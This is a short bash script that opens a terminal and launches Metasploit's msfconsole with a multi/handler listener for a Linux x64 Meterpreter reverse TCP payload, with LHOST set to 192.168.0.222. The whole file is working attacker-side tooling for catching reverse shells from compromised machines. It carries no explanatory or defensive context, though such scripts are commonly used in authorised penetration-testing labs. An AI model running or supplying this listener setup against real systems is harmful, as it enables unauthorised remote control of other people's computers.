#!/bin/bash

# Open a new terminal named "meterpreter" and execute the commands
gnome-terminal -- bash -c "
echo 'Launching msfconsole...';
msfconsole -q -x '
use exploit/multi/handler;
set payload linux/x64/meterpreter/reverse_tcp;
set LHOST 192.168.0.222;
exploit;
' "
